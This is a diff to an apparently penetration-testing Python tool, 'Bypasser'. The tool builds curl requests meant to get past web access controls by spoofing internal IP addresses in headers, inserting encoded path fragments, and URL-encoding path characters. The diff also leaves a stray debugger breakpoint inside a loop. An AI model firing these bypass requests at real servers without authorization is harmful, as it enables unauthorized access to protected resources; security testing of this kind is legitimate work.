@@ -43,7 +43,7 @@ config = dict()
 const_internal_ips = list()
 const_internal_ips.append("*")
 const_internal_ips.append("0.0.0.0")
-const_internal_ips.append("0177.1") # Thanks to @Agarri_FR
+const_internal_ips.append("0177.1")  # Thanks to @Agarri_FR
 const_internal_ips.append("10.0.0.1")
 const_internal_ips.append("127.0.0.1")
 const_internal_ips.append("192.168.0.2")
@@ -387,6 +387,11 @@ const_paths.append("%3f%23")
 const_paths.append("%3f%3f")
 
 
+def replacenth(string, sub, wanted, n):
+    where = [m.start() for m in re.finditer(sub, string)][n - 1]
+    return string[:where] + string[where:].replace(sub, wanted, 1)
+
+
 class Bypasser:
     def __init__(self, config):
         self.url = config.get("url")
@@ -455,23 +460,20 @@ class Bypasser:
                     f"{base_curl} -H '{const_header_port}: {const_prort}' '{full_url}'"
                 )
 
-        # Custom paths
-        for const_path in const_paths:
-            self.curls.append(f"{base_curl} '{base_url}/{const_path}{base_path}'")
-            self.curls.append(f"{base_curl} '{base_url}/{base_path}{const_path}'")
-            self.curls.append(f"{base_curl} '{base_url}/{base_path}/{const_path}'")
-
         # Custom paths with extra-mid-slash
-        slash_indexes = [span.start() for span in re.finditer(r"/", base_path)]
-        slash_indexes.remove(0)  # Already dealt with in other cases
-        for slash_index in slash_indexes:
+        for idx_slash in range(base_path.count("/")):
             for const_path in const_paths:
-                self.curls.append(
-                    f"{base_curl} '{base_url}/{base_path[:slash_index+1]}/{const_path}/{base_path[slash_index:]}'"
-                )
-                self.curls.append(
-                    f"{base_curl} '{base_url}/{base_path[:slash_index+1]}/{const_path.lstrip('/')}/{base_path[slash_index:]}'"
-                )
+                path_post = replacenth(base_path, "/", f"/{const_path}", idx_slash)
+                self.curls.append(f"{base_curl} '{base_url}{path_post}'")
+                self.curls.append(f"{base_curl} '{base_url}/{path_post}'")
+                if idx_slash <= 1:
+                    continue
+                path_pre = replacenth(base_path, "/", f"{const_path}/", idx_slash)
+                self.curls.append(f"{base_curl} '{base_url}{path_pre}'")
+                self.curls.append(f"{base_curl} '{base_url}/{path_pre}'")
+                for curl in self.curls:
+                    if "com.;/" in curl:
+                        import ipdb; ipdb.set_trace()
 
         # Other bypasses
         abc_indexes = [span.start() for span in re.finditer(r"[a-zA-Z]", base_path)]
@@ -488,7 +490,7 @@ class Bypasser:
             # Url-Encoding
             char_urlencoded = format(ord(base_path[abc_indexe]), "02x")
             self.curls.append(
-                f"{base_curl} '{base_url}/{base_path[:abc_indexe]}{char_urlencoded}{base_path[abc_indexe+1:]}'"
+                f"{base_curl} '{base_url}/{base_path[:abc_indexe]}%{char_urlencoded}{base_path[abc_indexe+1:]}'"
             )
 
         # Sanitize and debug-print
@@ -498,7 +500,7 @@ class Bypasser:
             logger.debug(curl.replace(base_curl, ""))
 
         # IDEA Generate moooooore with cross products?
-        # Not doing for now, already so many curls.. :)
+        # Not doing for now, so many curls already... :)
         return
 
     def run_curl(self, curl):
